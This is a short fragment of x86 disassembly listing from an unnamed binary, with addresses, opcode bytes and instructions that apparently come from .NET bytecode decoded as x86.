  404cf4:	32 00                	xor    (%eax),%al
  404cf6:	00 04 da             	add    %al,(%edx,%ebx,8)
  404cf9:	80 2a 00             	subb   $0x0,(%edx)
  404cfc:	00 04 7e             	add    %al,(%esi,%edi,2)
  404cff:	2a 00                	sub    (%eax),%al
  404d01:	00 04 16             	add    %al,(%esi,%edx,1)
  404d04:	31 1b                	xor    %ebx,(%ebx)
  404d06:	7e 2a                	jle    0x404d32
  404d08:	00 00                	add    %al,(%eax)
  404d0a:	04 6c                	add    $0x6c,%al
  404d0c:	23 00                	and    (%eax),%eax
  404d0e:	00 00                	add    %al,(%eax)
  404d10:	00 00                	add    %al,(%eax)
  404d12:	40                   	inc    %eax
  404d13:	8f 40 5b             	pop    0x5b(%eax)
  404d16:	28 69 00             	sub    %ch,0x0(%ecx)
  404d19:	00 0a                	add    %cl,(%edx)
  404d1b:	b7 0a                	mov    $0xa,%bh
  404d1d:	2b 06                	sub    (%esi),%eax
  404d1f:	2b 04 16             	sub    (%esi,%edx,1),%eax
  404d22:	0a 2b                	or     (%ebx),%ch
  404d24:	00 06                	add    %al,(%esi)
  404d26:	2a 00                	sub    (%eax),%al
  404d28:	13 30                	adc    (%eax),%esi
  404d2a:	02 00                	add    (%eax),%al
  404d2c:	50                   	push   %eax
  404d2d:	00 00                	add    %al,(%eax)
  404d2f:	00 32                	add    %dh,(%edx)
  404d31:	00 00                	add    %al,(%eax)
  404d33:	11 2b                	adc    %ebp,(%ebx)
  404d35:	49                   	dec    %ecx
  404d36:	20 e8                	and    %ch,%al
  404d38:	03 00                	add    (%eax),%eax
  404d3a:	00 28                	add    %ch,(%eax)
  404d3c:	21 00                	and    %eax,(%eax)
  404d3e:	00 0a                	add    %cl,(%edx)
  404d40:	28 58 00             	sub    %bl,0x0(%eax)
